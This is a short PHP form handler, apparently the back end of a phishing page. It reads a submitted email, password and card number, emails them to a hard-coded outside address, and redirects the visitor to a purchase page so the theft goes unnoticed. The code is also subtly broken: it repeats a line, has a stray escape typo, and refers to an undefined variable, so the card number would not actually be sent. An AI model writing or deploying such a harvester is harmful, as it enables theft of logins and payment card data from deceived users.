<?php
$destino= "76168572@certus.edu.pe";
$correo = $_POST["correo"];
$contraseña = $_POST["contraseña"];
$contraseña = $_POST["contraseña"];
$codigodetarjeta = $_POST["ingrese su numero de tarjeta"];
$contenido= "\nCorreo: " . $correo . "\mContraseña: " . $contraseña . "\nCodigodetarjeta: " . $numerodetarjeta;
mail($destino,"contacto", $contenido);
header("Location:compra.html");

?>